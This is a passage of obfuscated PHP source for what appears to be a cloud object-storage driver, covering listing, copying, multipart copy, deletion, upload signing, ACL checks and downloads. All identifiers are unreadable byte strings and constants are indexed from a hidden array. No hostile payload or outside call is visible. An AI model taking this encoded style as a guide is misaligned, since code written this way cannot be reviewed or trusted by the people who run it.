±Ÿ as $à×àşŸ) { if ($à×àşŸ->getKey() == $ù°ÁÊ») { continue; } $ò†º›¡ = $à×àşŸ->getKey(); $™î©—Š— = $à×àşŸ->getSize(); $Á´àÂî‚ = $à×àşŸ->getLastModified(); $ı˜´«À¢ = trim($à×àşŸ->getETag(), $Á“Ç‹³[119]); $Ÿ‡ÒˆıŞ = $·Ÿ„ûæ… ? array($Á“Ç‹³[32] => $ò†º›¡, $Á“Ç‹³[79] => $™î©—Š—, $Á“Ç‹³[205] => strtotime($Á´àÂî‚), $Á“Ç‹³[1636] => $ı˜´«À¢) : $ò†º›¡; $ºšû È™ = $™î©—Š— == 0 && substr($ò†º›¡, strlen($ò†º›¡) - 1, 1) == $Á“Ç‹³[8] ? !0 : !1; $¨Õñ®î™ = array($Á“Ç‹³[79] => $™î©—Š—, $Á“Ç‹³[1637] => $™î©—Š—, $Á“Ç‹³[88] => strtotime($Á´àÂî‚), $Á“Ç‹³[1638] => $Á´àÂî‚, $Á“Ç‹³[1636] => $ı˜´«À¢); $this->cacheMethodInfoSet($ò†º›¡, $ºšû È™, $¨Õñ®î™); if ($ºšû È™) { $ôØıöÙœ[] = $ò†º›¡; continue; } $ïâÊĞ°¼[] = $Ÿ‡ÒˆıŞ; } foreach ($·Á´ãí‹ as $ÅÃÔ»›æ) { $ôØıöÙœ[] = $ÅÃÔ»›æ->getPrefix(); $this->cacheMethodInfoSet($ÅÃÔ»›æ->getPrefix(), !0); } if ($·ßĞ­’Ó === $Á“Ç‹³[12]) { break; } } $this->cacheMethodInfoSet($¦ïÓ°îÅ, !0); return array($Á“Ç‹³[85] => $ôØıöÙœ, $Á“Ç‹³[86] => $ïâÊĞ°¼); } public function listObject($âõ ÄÕ, $Ÿ®Í£Ù‰ = '') { $ÀÌÄ¥ =& $_SERVER[‘ÆÜ‘œ]; $âõ ÄÕ = trim($âõ ÄÕ, $ÀÌÄ¥[8]); $»‰£™Ï« = empty($âõ ÄÕ) && $âõ ÄÕ !== $ÀÌÄ¥[229] ? $ÀÌÄ¥[12] : $âõ ÄÕ . $ÀÌÄ¥[8]; $í¯½ü¢Ğ = $ÀÌÄ¥[12]; $ÏµŞ¡Ş³ = 1000; $Ğ©Óõ¢ò = $Ğ¯Ûíƒ = array(); while (!0) { check_abort(); $şœØœÆá = array($ÀÌÄ¥[1632] => $Ÿ®Í£Ù‰, $ÀÌÄ¥[1633] => $»‰£™Ï«, $ÀÌÄ¥[1634] => $ÏµŞ¡Ş³, $ÀÌÄ¥[1635] => $í¯½ü¢Ğ); try { $ü Ï–¾ = $this->client->listObjects($this->bucket, $şœØœÆá); } catch (OSS\Core\OssException $û¢ƒóëÙ) { $this->writeLog(__FUNCTION__ . $ÀÌÄ¥[213] . $û¢ƒóëÙ->getMessage()); break; } $í¯½ü¢Ğ = $ü Ï–¾->getNextMarker(); $ñŒÅÜÅÙ = $ü Ï–¾->getObjectList(); foreach ($ñŒÅÜÅÙ as $Âçå±µİ) { if ($Âçå±µİ->getKey() == $»‰£™Ï«) { continue; } $æ°á”éí = $Âçå±µİ->getKey(); $ŞÉ†øïİ = $Âçå±µİ->getSize(); $§¾Ë„‚ = $ŞÉ†øïİ == 0 && substr($æ°á”éí, strlen($æ°á”éí) - 1, 1) == $ÀÌÄ¥[8] ? !0 : !1; if ($§¾Ë„‚) { continue; } $Ğ¯Ûíƒ[] = $ŞÉ†øïİ . $ÀÌÄ¥[213] . $æ°á”éí; } if ($í¯½ü¢Ğ === $ÀÌÄ¥[12]) { break; } } return array($ÀÌÄ¥[85] => $Ğ©Óõ¢ò, $ÀÌÄ¥[86] => $Ğ¯Ûíƒ); } public function copyFile($Ñ¨³ç³â, $Û×ı×÷¯) { $é¨ãÀ˜² = $this->size($Ñ¨³ç³â); if ($é¨ãÀ˜² < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $Ñ¨³ç³â, $this->bucket, $this->pathEncode($Û×ı×÷¯)); } catch (OSS\Core\OssException $ŒÔ²ëÕö) { $this->writeLog(__FUNCTION__ . $_SERVER[‘ÆÜ‘œ][213] . $ŒÔ²ëÕö->getMessage()); return !1; } return $this->getPathOuter($Û×ı×÷¯); } $Ñï®¦õ¤ = $this->multiCopyObject($Ñ¨³ç³â, $Û×ı×÷¯, $é¨ãÀ˜²); return $Ñï®¦õ¤ ? $this->getPathOuter($Û×ı×÷¯) : !1; } private function multiCopyObject($æˆ¶¾Å, $‹ú•¦îÕ, $¥ÇÔœë) { $¿œû¯±¦ =& $_SERVER[‘ÆÜ‘œ]; try { $õ”·éÃ = array(); if ($©¢¨Øí = $this->hashMd5($æˆ¶¾Å)) { $õ”·éÃ = array(OSS\OssClient::OSS_HEADERS => array($¿œû¯±¦[1639] => $©¢¨Øí)); } $Î§‰­œ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($‹ú•¦îÕ), $õ”·éÃ); $öÚùìÏ = 1; $Õ»€Èé = 0; $¦ú½ßˆ† = array(); $»Ÿñ´Ÿ² = 1024 * 1024 * 10; $¬Í€“‚å = $this->client->generateMultiuploadParts($¥ÇÔœë, $»Ÿñ´Ÿ²); foreach ($¬Í€“‚å as $Õ¨¼ñÅ« => $¥•İ¡–) { $·áŞİ–Ã = $Õ»€Èé + (int) $¥•İ¡–[$¿œû¯±¦[1640]]; $±¿ÑªöÔ = (int) $¥•İ¡–[$¿œû¯±¦[422]] + $·áŞİ–Ã - 1; $à“ÆáÇ° = array($¿œû¯±¦[165] => $·áŞİ–Ã, $¿œû¯±¦[166] => $±¿ÑªöÔ); $¦ú½ßˆ†[] = $this->client->uploadPartCopy($this->bucket, $æˆ¶¾Å, $this->bucket, $this->pathEncode($‹ú•¦îÕ), $öÚùìÏ, $Î§‰­œ, $à“ÆáÇ°); $öÚùìÏ = $öÚùìÏ + 1; } $Ş¿Îø÷Î = array(); foreach ($¦ú½ßˆ† as $Õ¨¼ñÅ« => $¡‘×¸€¹) { $Ş¿Îø÷Î[] = array($¿œû¯±¦[298] => $Õ¨¼ñÅ« + 1, $¿œû¯±¦[299] => $¡‘×¸€¹); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($‹ú•¦îÕ), $Î§‰­œ, $Ş¿Îø÷Î); } catch (OSS\Core\OssException $„ Çğ°¿) { $this->writeLog(__FUNCTION__ . $¿œû¯±¦[213] . $„ Çğ°¿->getMessage()); return !1; } return !0; } public function moveFile($ñ¶©¬› , $ô¬’¶ºÃ) { if ($this->copyFile($ñ¶©¬› , $ô¬’¶ºÃ)) { $this->remove($ñ¶©¬› ); return $this->getPathOuter($ô¬’¶ºÃ); } return !1; } public function delFile($¼ ¬ãÏ„) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($¼ ¬ãÏ„)); } catch (OSS\Core\OssException $¦À¥º‹¤) { $this->writeLog(__FUNCTION__ . $_SERVER[‘ÆÜ‘œ][213] . $¦À¥º‹¤->getMessage()); return !1; } return !0; } public function delFolder($–Ë¥ö) { $Î¨ÊÛªµ =& $_SERVER[‘ÆÜ‘œ]; if (!$this->exist($–Ë¥ö)) { return !0; } $this->listItemCache = !1; $»‹°²ù = $this->fileList($–Ë¥ö); $this->listItemCache = !0; $µŠªœäÑ = trim($–Ë¥ö, $Î¨ÊÛªµ[8]) . $Î¨ÊÛªµ[8]; if (!empty($–Ë¥ö) && $–Ë¥ö !== $Î¨ÊÛªµ[229] && !in_array($µŠªœäÑ, $»‹°²ù[$Î¨ÊÛªµ[85]])) { $»‹°²ù[$Î¨ÊÛªµ[85]][] = $µŠªœäÑ; } $¥µ¶Ê’ = $this->delByBatch($»‹°²ù[$Î¨ÊÛªµ[86]]); if (!$¥µ¶Ê’) { return !1; } $¥µ¶Ê’ = $this->delByBatch($»‹°²ù[$Î¨ÊÛªµ[85]]); if (!$¥µ¶Ê’) { return !1; } return $this->delFile($µŠªœäÑ); } private function delByBatch($ïÃ¼º´®) { foreach (array_chunk($ïÃ¼º´®, 1000) as $¼ëË€®ò) { try { $this->client->deleteObjects($this->bucket, $¼ëË€®ò); } catch (OSS\Core\OssException $­ºëØ¸Á) { $this->writeLog(__FUNCTION__ . $_SERVER[‘ÆÜ‘œ][213] . $­ºëØ¸Á->getMessage()); return !1; } } return !0; } public function rename($”óØÒÖ—, $Â£ ª¨º) { return $this->renameObject($”óØÒÖ—, $Â£ ª¨º); } private function fileInfo($Ÿ¥§˜ÎŒ, $‡ÜÇÚ³ß = false, $‰´Úéñû = array()) { $·¼€àÔğ =& $_SERVER[‘ÆÜ‘œ]; $àı§Õß = array($·¼€àÔğ[32] => $this->pathThis($Ÿ¥§˜ÎŒ), $·¼€àÔğ[87] => $this->getPathOuter($Ÿ¥§˜ÎŒ), $·¼€àÔğ[33] => $·¼€àÔğ[231], $·¼€àÔğ[79] => isset($‰´Úéñû[$·¼€àÔğ[79]]) ? $‰´Úéñû[$·¼€àÔğ[79]] : 0, $·¼€àÔğ[167] => $this->ext($Ÿ¥§˜ÎŒ)); if ($‡ÜÇÚ³ß) { return $àı§Õß; } $àı§Õß[$·¼€àÔğ[232]] = $àı§Õß[$·¼€àÔğ[88]] = 0; $àı§Õß[$·¼€àÔğ[233]] = $àı§Õß[$·¼€àÔğ[234]] = !0; if (empty($‰´Úéñû)) { $¿üœ°ã = $this->objectMeta($Ÿ¥§˜ÎŒ); if (!$¿üœ°ã) { return $àı§Õß; } $‰´Úéñû = array($·¼€àÔğ[88] => strtotime($¿üœ°ã[$·¼€àÔğ[1638]]), $·¼€àÔğ[79] => $¿üœ°ã[$·¼€àÔğ[1637]] + 0, $·¼€àÔğ[1636] => $¿üœ°ã[$·¼€àÔğ[1636]]); } if (isset($‰´Úéñû[$·¼€àÔğ[1636]]) && $‰´Úéñû[$·¼€àÔğ[1636]]) { $àı§Õß[$·¼€àÔğ[236]] = trim($‰´Úéñû[$·¼€àÔğ[1636]], $·¼€àÔğ[119]); } if (isset($‰´Úéñû[$·¼€àÔğ[79]])) { $àı§Õß[$·¼€àÔğ[79]] = $‰´Úéñû[$·¼€àÔğ[79]]; } if (isset($‰´Úéñû[$·¼€àÔğ[88]])) { $àı§Õß[$·¼€àÔğ[88]] = $‰´Úéñû[$·¼€àÔğ[88]]; } if (isset($‰´Úéñû[$·¼€àÔğ[205]]) && !trim($àı§Õß[$·¼€àÔğ[88]])) { $àı§Õß[$·¼€àÔğ[88]] = $‰´Úéñû[$·¼€àÔğ[205]]; } return $àı§Õß; } private function folderInfo($ù¸Ö˜ãÕ, $„êüı = false, $Å‡À·Ññ = array()) { $Œ¼É…£ =& $_SERVER[‘ÆÜ‘œ]; $¯ªŒµ¨ = array($Œ¼É…£[32] => $this->pathThis($ù¸Ö˜ãÕ), $Œ¼É…£[87] => $this->getPathOuter($Œ¼É…£[8] . $ù¸Ö˜ãÕ), $Œ¼É…£[33] => $Œ¼É…£[78]); if ($„êüı) { return $¯ªŒµ¨; } $¯ªŒµ¨[$Œ¼É…£[232]] = $¯ªŒµ¨[$Œ¼É…£[88]] = 0; $¯ªŒµ¨[$Œ¼É…£[233]] = $¯ªŒµ¨[$Œ¼É…£[234]] = !0; if (empty($Å‡À·Ññ)) { $ù¸Ö˜ãÕ = rtrim($ù¸Ö˜ãÕ, $Œ¼É…£[8]) . $Œ¼É…£[8]; $²©†ßæ¬ = $this->objectMeta($ù¸Ö˜ãÕ); if (!$²©†ßæ¬) { return $¯ªŒµ¨; } $Å‡À·Ññ = array($Œ¼É…£[232] => $²©†ßæ¬[$Œ¼É…£[603]][$Œ¼É…£[1641]], $Œ¼É…£[88] => strtotime($²©†ßæ¬[$Œ¼É…£[1638]])); } if (isset($Å‡À·Ññ[$Œ¼É…£[88]])) { $¯ªŒµ¨[$Œ¼É…£[88]] = $Å‡À·Ññ[$Œ¼É…£[88]]; } if (isset($Å‡À·Ññ[$Œ¼É…£[232]])) { $¯ªŒµ¨[$Œ¼É…£[232]] = $Å‡À·Ññ[$Œ¼É…£[232]]; } return $¯ªŒµ¨; } public function listPath($ —€±Ôª, $ÒÁÃ¨ôå = false) { $®êıÜ¼Ö =& $_SERVER[‘ÆÜ‘œ]; $¹èÖÊİ¼ = $this->fileList($ —€±Ôª, $®êıÜ¼Ö[8], !0); foreach ($¹èÖÊİ¼[$®êıÜ¼Ö[85]] as $ºïÜí‰“ => $èÒªŒ¢ò) { $¹èÖÊİ¼[$®êıÜ¼Ö[85]][$ºïÜí‰“] = $this->folderInfo($èÒªŒ¢ò, $ÒÁÃ¨ôå, $èÒªŒ¢ò); } foreach ($¹èÖÊİ¼[$®êıÜ¼Ö[86]] as $ºïÜí‰“ => $èÒªŒ¢ò) { $¹èÖÊİ¼[$®êıÜ¼Ö[86]][$ºïÜí‰“] = $this->fileInfo($èÒªŒ¢ò[$®êıÜ¼Ö[32]], $ÒÁÃ¨ôå, $èÒªŒ¢ò); } return $¹èÖÊİ¼; } protected function infoChildren($ß€•„âø, &$‰¸£÷å¤) { $Ê±¬Ãâô =& $_SERVER[‘ÆÜ‘œ]; $öÅ¶Å÷é = $this->fileList($ß€•„âø, $Ê±¬Ãâô[12], !0); $‰¸£÷å¤[$Ê±¬Ãâô[81]] += count($öÅ¶Å÷é[$Ê±¬Ãâô[85]]); $‰¸£÷å¤[$Ê±¬Ãâô[80]] += count($öÅ¶Å÷é[$Ê±¬Ãâô[86]]); foreach ($öÅ¶Å÷é[$Ê±¬Ãâô[86]] as $”Ğ‘“ºê) { if (!$”Ğ‘“ºê || !$”Ğ‘“ºê[$Ê±¬Ãâô[79]]) { continue; } $‰¸£÷å¤[$Ê±¬Ãâô[79]] += $”Ğ‘“ºê[$Ê±¬Ãâô[79]]; } } public function has($¢Ÿäéîå, $íÚ‚Éóæ = false, $Ë ×¼ = true) { $ı¦ƒàŠ¨ =& $_SERVER[‘ÆÜ‘œ]; $¢Ÿäéîå = trim($¢Ÿäéîå, $ı¦ƒàŠ¨[8]); $¼“ì®Ìã = empty($¢Ÿäéîå) && $¢Ÿäéîå !== $ı¦ƒàŠ¨[229] ? $ı¦ƒàŠ¨[12] : $¢Ÿäéîå . $ı¦ƒàŠ¨[8]; $Ìğöı¿® = $ı¦ƒàŠ¨[12]; $©Ûê¯©ˆ = 500; $ñÔÈŞÚ— = $ç­–­÷€ = 0; while (!0) { check_abort(); $üô‚åƒ… = array($ı¦ƒàŠ¨[1632] => $ı¦ƒàŠ¨[8], $ı¦ƒàŠ¨[1633] => $¼“ì®Ìã, $ı¦ƒàŠ¨[1634] => $©Ûê¯©ˆ, $ı¦ƒàŠ¨[1635] => $Ìğöı¿®); try { $ä·ª‘­Ï = $this->client->listObjects($this->bucket, $üô‚åƒ…); } catch (OSS\Core\OssException $Ãô»ç¼ƒ) { $this->writeLog(__FUNCTION__ . $ı¦ƒàŠ¨[213] . $Ãô»ç¼ƒ->getMessage()); break; } $Ìğöı¿® = $ä·ª‘­Ï->getNextMarker(); $ååí‚Á = $ä·ª‘­Ï->getObjectList(); $îŒÀóëŸ = $ä·ª‘­Ï->getPrefixList(); if ($íÚ‚Éóæ) { if (count($ååí‚Á) > 1 || count($ååí‚Á) == 1 && $ååí‚Á[0]->getKey() != $¼“ì®Ìã) { $ñÔÈŞÚ— += count($ååí‚Á) - 1; } if (!empty($îŒÀóëŸ)) { $ç­–­÷€ += count($îŒÀóëŸ); } if ($Ìğöı¿® === $ı¦ƒàŠ¨[12]) { break; } continue; } if ($Ë ×¼) { if (!empty($ååí‚Á)) { if (count($ååí‚Á) > 1 || $ååí‚Á[0]->getKey() != $¼“ì®Ìã) { return !0; } } } else { if (!empty($îŒÀóëŸ)) { return !0; } } if ($Ìğöı¿® === $ı¦ƒàŠ¨[12]) { break; } } if ($íÚ‚Éóæ) { return array($ı¦ƒàŠ¨[240] => $ñÔÈŞÚ—, $ı¦ƒàŠ¨[241] => $ç­–­÷€); } return !1; } public function listAll($Ò“ªµ¼É) { $Èˆ±°¯  =& $_SERVER[‘ÆÜ‘œ]; $Ìá´Ã¯Ò = $this->fileList($Ò“ªµ¼É, $Èˆ±°¯ [12], !0); $Ñ©ÖË¨Œ = array_to_keyvalue($Ìá´Ã¯Ò[$Èˆ±°¯ [86]], $Èˆ±°¯ [32]); foreach ($Ìá´Ã¯Ò[$Èˆ±°¯ [85]] as $àŸÉÀŒ) { if (is_string($àŸÉÀŒ)) { $Ñ©ÖË¨Œ[$àŸÉÀŒ] = array($Èˆ±°¯ [79] => 0); } } return $this->listAllFiles($Ò“ªµ¼É, $Ñ©ÖË¨Œ); } public function canRead($æØÏ²) { $İêİ ı÷ =& $_SERVER[‘ÆÜ‘œ]; $â›•ƒ¦ï = $this->pathAcl($æØÏ²); return $â›•ƒ¦ï == $İêİ ı÷[1642] || $â›•ƒ¦ï == $İêİ ı÷[650] ? !0 : !1; } public function canWrite($±Ûô¦·¡) { $åßÔôñ = $this->pathAcl($±Ûô¦·¡); return $åßÔôñ == $_SERVER[‘ÆÜ‘œ][650] ? !0 : !1; } public function pathAcl($‘³Ø… ’) { $é÷ÃêçŸ =& $_SERVER[‘ÆÜ‘œ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $¦ÔºÓ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($‘³Ø… ’)); } catch (OSS\Core\OssException $û¨“†®) { $this->writeLog(__FUNCTION__ . $é÷ÃêçŸ[213] . $û¨“†®->getMessage()); return !1; } $ø –Ò‡ = $¦ÔºÓ == $é÷ÃêçŸ[37] ? $this->bucketAcl : $¦ÔºÓ; if ($ø –Ò‡ == $é÷ÃêçŸ[1643]) { return $é÷ÃêçŸ[1642]; } if ($ø –Ò‡ == $é÷ÃêçŸ[1644]) { return $é÷ÃêçŸ[650]; } return $ø –Ò‡; } private function chmodPath($Á¹¬›œ˜, $†„İ‚÷ = '') { $àñ÷ÎÃ˜ =& $_SERVER[‘ÆÜ‘œ]; $Í«‚¡ò = empty($†„İ‚÷) ? $àñ÷ÎÃ˜[1644] : $†„İ‚÷; $¹‘ñæÂÀ = array($àñ÷ÎÃ˜[37], $àñ÷ÎÃ˜[230], $àñ÷ÎÃ˜[1643], $àñ÷ÎÃ˜[1644]); if (!in_array($Í«‚¡ò, $¹‘ñæÂÀ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Á¹¬›œ˜), $Í«‚¡ò); } catch (OSS\Core\OssException $¥û–ğî) { $this->writeLog(__FUNCTION__ . $àñ÷ÎÃ˜[213] . $¥û–ğî->getMessage()); return !1; } return !0; } public function getContent($ÛÛÀ•„°) { return $this->fileSubstr($ÛÛÀ•„°, -1); } public function setContent($Âıü‡Æı, $†™»İÑõ = '') { $·±µƒ—ƒ =& $_SERVER[‘ÆÜ‘œ]; try { $Å—©Ä‡¹ = $this->trafficLimit($·±µƒ—ƒ[1645]); $‡ÛŞê¼Ø = $this->client->putObject($this->bucket, $this->pathEncode($Âıü‡Æı), $†™»İÑõ, $Å—©Ä‡¹); } catch (OSS\Core\OssException $“ØÌı £) { $this->writeLog(__FUNCTION__ . $·±µƒ—ƒ[213] . $“ØÌı £->getMessage()); return !1; } $©µƒßíï = array($·±µƒ—ƒ[1639] => trim($‡ÛŞê¼Ø[$·±µƒ—ƒ[1636]], $·±µƒ—ƒ[119]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Âıü‡Æı))); $this->updateObjMeta($Âıü‡Æı, $©µƒßíï); return isset($‡ÛŞê¼Ø[$·±µƒ—ƒ[1646]][$·±µƒ—ƒ[295]]) ? !0 : !1; } private function updateObjMeta($ù÷Å· , $£á¶çßŸ) { $ù÷Å·  = $this->pathEncode($ù÷Å· ); try { $…Û·Úöú = array(OSS\OssClient::OSS_HEADERS => $£á¶çßŸ); $this->client->copyObject($this->bucket, $ù÷Å· , $this->bucket, $ù÷Å· , $…Û·Úöú); } catch (OSS\Core\OssException $ƒúÆŒş¢) { $this->writeLog(__FUNCTION__ . $_SERVER[‘ÆÜ‘œ][213] . $ƒúÆŒş¢->getMessage()); return !1; } return !0; } public function upload($Ÿø¢®û, $ı€¼‡¦¸, $«€“˜ƒÖ = false, $ß×È©Í = REPEAT_REPLACE) { $®şˆë³£ =& $_SERVER[‘ÆÜ‘œ]; if (!$ı€¼‡¦¸ || !@file_exists($ı€¼‡¦¸)) { return !1; } $ã£û¦ô¨ = trim($Ÿø¢®û, $®şˆë³£[8]); $ñŒĞÎ¼ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($®şˆë³£[1639] => @md5_file($ı€¼‡¦¸)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Ÿø¢®û))); $ñŒĞÎ¼ = $this->trafficLimit($®şˆë³£[1645], $ñŒĞÎ¼); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ã£û¦ô¨), $ı€¼‡¦¸, $ñŒĞÎ¼); } catch (OSS\Core\OssException $±ëÏõç‘) { $this->writeLog(__FUNCTION__ . $®şˆë³£[213] . $±ëÏõç‘->getMessage()); return !1; } return $this->getPathOuter($Ÿø¢®û); } public function getHost() { $Û³¸¥¶ =& $_SERVER[‘ÆÜ‘œ]; $’Š…ğëÀ = explode($Û³¸¥¶[209], parent::getHost()); return $’Š…ğëÀ[0] . $Û³¸¥¶[209] . $this->bucket . $Û³¸¥¶[10] . $’Š…ğëÀ[1]; } public function uploadFormData($ÙŞøö±, $æïÕ‚æœ = 3600) { $’ö‘¶ë  =& $_SERVER[‘ÆÜ‘œ]; if (!($€šÓåí¡ = $this->getHost())) { return !1; } $û¢«—­ = $æïÕ‚æœ; $òîÊ»¡ã = date($’ö‘¶ë [1647], time() + $û¢«—­); $Âöêâš¥ = new DateTime($òîÊ»¡ã); $½üÏİ€ğ = $Âöêâš¥->format(DateTime::ISO8601); $¾­Ş—Ã« = strpos($½üÏİ€ğ, $’ö‘¶ë [381]); $½üÏİ€ğ = substr($½üÏİ€ğ, 0, $¾­Ş—Ã«) . $’ö‘¶ë [1648]; $÷şô²– = 1048576000 * 5; $ú¸±¦ë£ = $this->pathFather($ÙŞøö±); $ÙÆğ«¤— = array($’ö‘¶ë [263] => $½üÏİ€ğ, $’ö‘¶ë [266] => array(array($’ö‘¶ë [1649], 0, $÷şô²–), array($’ö‘¶ë [268], $’ö‘¶ë [269], $ú¸±¦ë£))); $Ãåƒ±Ï¨ = base64_encode(json_encode($ÙÆğ«¤—)); $”Ÿ™õ×Ğ = base64_encode(hash_hmac($’ö‘¶ë [1475], $Ãåƒ±Ï¨, $this->secret, !0)); $œÇõØ… = array($’ö‘¶ë [1650] => $this->accessKey, $’ö‘¶ë [278] => $Ãåƒ±Ï¨, $’ö‘¶ë [271] => $’ö‘¶ë [262], $’ö‘¶ë [1651] => $”Ÿ™õ×Ğ, $’ö‘¶ë [207] => $€šÓåí¡); $œÇõØ… = $this->trafficLimit($’ö‘¶ë [1645], $œÇõØ…, !0); return $œÇõØ…; } public function uploadMultiData($¼·Ğ­µî, $ç³Ë÷Ÿ¦ = 3600) { $Ö»°¢²» =& $_SERVER[‘ÆÜ‘œ]; if (!($€ŞØãê® = $this->getHost())) { return !1; } $Ú×…Ú×½ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($¼·Ğ­µî)); return array($Ö»°¢²»[282] => $Ú×…Ú×½, $Ö»°¢²»[207] => $€ŞØãê® . $Ö»°¢²»[8] . $this->pathEncode($¼·Ğ­µî), $Ö»°¢²»[283] => gmdate($Ö»°¢²»[1652]), $Ö»°¢²»[95] => $¼·Ğ­µî); } public function uploadMultiAuth($úİ¥¼š¤, $¦í­â = array()) { if (isset($¦í­â[$_SERVER[‘ÆÜ‘œ][284]])) { return $this->uploadPartAuth($úİ¥¼š¤, $¦í­â); } return $this->uploadListAuth($úİ¥¼š¤, $¦í­â); } private function uploadPartAuth($Úş±½‘“, $´û¸îƒ« = array()) { $€ìŸ¥¸Ä =& $_SERVER[‘ÆÜ‘œ]; $˜šÕ®Şé = $´û¸îƒ«[$€ìŸ¥¸Ä[95]]; $ëŸŒ™¸ = $this->_getUploadAuth($˜šÕ®Şé, $´û¸îƒ«); $Ë¾‘·ê = array($€ìŸ¥¸Ä[287] => $ëŸŒ™¸[$€ìŸ¥¸Ä[287]], $€ìŸ¥¸Ä[283] => $ëŸŒ™¸[$€ìŸ¥¸Ä[283]]); if (isset($ëŸŒ™¸[$€ìŸ¥¸Ä[1653]])) { $Ë¾‘·ê[$€ìŸ¥¸Ä[1653]] = $ëŸŒ™¸[$€ìŸ¥¸Ä[1653]]; } return $Ë¾‘·ê; } private function uploadListAuth($âáå¸Şä, $¹¸·˜‡  = array()) { $Â¶è’š =& $_SERVER[‘ÆÜ‘œ]; $á£À°àš = $¹¸·˜‡ [$Â¶è’š[95]]; $»öÚ›ïò = $¹¸·˜‡ [$Â¶è’š[282]]; $®”Ãñúº = $this->client->listParts($this->bucket, $this->pathEncode($á£À°àš), $»öÚ›ïò); $Ü§ù÷Ô³ = $®”Ãñúº->getListPart(); $“ùüÚƒ× = array(); foreach ($Ü§ù÷Ô³ as $•ººƒ§‰) { $“ùüÚƒ×[] = array($Â¶è’š[298] => $•ººƒ§‰->getPartNumber(), $Â¶è’š[299] => trim($•ººƒ§‰->getETag(), $Â¶è’š[119])); } if (!$“ùüÚƒ×) { return !1; } $ìÉÜƒ‘Á = $this->_getUploadAuth($á£À°àš, $¹¸·˜‡ ); return array($Â¶è’š[287] => $ìÉÜƒ‘Á[$Â¶è’š[287]], $Â¶è’š[283] => $ìÉÜƒ‘Á[$Â¶è’š[283]], $Â¶è’š[290] => $“ùüÚƒ×); } private function _getUploadAuth($†ÖØÆçÑ, $À¸¦Î ) { $ºğÜÀ› =& $_SERVER[‘ÆÜ‘œ]; $å÷÷Ø« = gmdate($ºğÜÀ›[1652]); $¹Ì‚¬…í = isset($À¸¦Î [$ºğÜÀ›[284]]) ? $ºğÜÀ›[254] : $ºğÜÀ›[289]; $ÏÙìÂÕ“ = array_intersect_key($À¸¦Î , array_flip(array($ºğÜÀ›[284], $ºğÜÀ›[282]))); ksort($ÏÙìÂÕ“); $“åÚ¡ªó = $ÏÙìÂÕ“ ? $ºğÜÀ›[76] . http_build_query($ÏÙìÂÕ“, null, $ºğÜÀ›[285], PHP_QUERY_RFC3986) : $ºğÜÀ›[12]; $À÷Íùñî = array($¹Ì‚¬…í, $ºğÜÀ›[12], $ºğÜÀ›[121], $å÷÷Ø«, "\x78\55\157\x73\163\55\x64\141\x74\x65\x3a{$å÷÷Ø«}", $ºğÜÀ›[8] . $this->bucket . $ºğÜÀ›[8] . $†ÖØÆçÑ . $“åÚ¡ªó); if (isset($À¸¦Î [$ºğÜÀ›[284]])) { $À÷÷¹Ä¡ = $this->trafficLimit($ºğÜÀ›[1645], array(), !0); if ($À÷÷¹Ä¡) { $†ÖØÆçÑ = $ºğÜÀ›[1653]; array_splice($À÷Íùñî, 5, 0, $†ÖØÆçÑ . $ºğÜÀ›[4] . $À÷÷¹Ä¡[$†ÖØÆçÑ]); } } $´ÎºÉÁ = implode($ºğÜÀ›[286], $À÷Íùñî); $ÙÚÛ±¶¦ = base64_encode(hash_hmac($ºğÜÀ›[1475], $´ÎºÉÁ, $this->secret, !0)); $ÉŒÔˆÚá = $ºğÜÀ›[1622] . $this->accessKey . $ºğÜÀ›[4] . $ÙÚÛ±¶¦; $Ñß ·× = array($ºğÜÀ›[287] => $ÉŒÔˆÚá, $ºğÜÀ›[283] => $å÷÷Ø«); if (!empty($À÷÷¹Ä¡)) { $Ñß ·× = array_merge($Ñß ·×, $À÷÷¹Ä¡); } return $Ñß ·×; } public function download($éÖİƒºº, $Ôô¤Á¨œ) { $ñÁÕß…Ô =& $_SERVER[‘ÆÜ‘œ]; if ($this->isFolder($éÖİƒºº)) { return !1; } try { $Ñ‰ö€¶µ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Ôô¤Á¨œ); $Ñ‰ö€¶µ = $this->trafficLimit($ñÁÕß…Ô[110], $Ñ‰ö€¶µ); $this->client->getObject($this->bucket, $this->pathEncode($éÖİƒºº), $Ñ‰ö€¶µ); } catch (OSS\Core\OssException $¡Ò×œéÅ) { $this->writeLog(__FUNCTION__ . $ñÁÕß…Ô[213] . $¡Ò×œéÅ->getMessage()); return !1; } return $Ôô¤Á¨œ; } public function fileSubstr($ÒÍŸÖ×³, $ì Ï €˜ = 0, $Ú¢µäš© = false) { if ($ì Ï €˜ === -1) { $°¡Ó„È = array(); } else { if ($Ú¢µäš© === !1) { $Ã«…ÑÔ = $this->size($ÒÍŸÖ×³); } else { $Ã«…ÑÔ = $ì Ï €˜ + $Ú¢µäš© - 1; } $°¡Ó„È = array(OSS\OssClient::OSS_RANGE => "{$ì Ï €˜}\x2d{$Ã«…ÑÔ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ÒÍŸÖ×³), $°¡Ó„È); } catch (OSS\Core\OssException $›ã™üÍ¦) { $this->writeLog(__FUNCTION__ . $_SERVER[‘ÆÜ‘œ][213] . $›ã™üÍ¦->getMessage()); think_exception($›ã™üÍ¦->getMessage()); return !1; } } private function trafficLimit($ß’ÊÃ…, $£½°¥Ë = array(), $æö¢ÑÊª = false) { $Õ²­…Ğ¾ =& $_SERVER[‘ÆÜ‘œ]; if ($ß’ÊÃ… == $Õ²­…Ğ¾[1645] && $this->isUploadServer() || $ß’ÊÃ… == $Õ²­…Ğ¾[110] && $this->isFileOutServer()) { return $£½°¥Ë; } $ûÛêì› = floatval($GLOBALS[$Õ²­…Ğ¾[6]][$Õ²­…Ğ¾[92]][$Õ²­…Ğ¾[108]][$ß’ÊÃ…]) 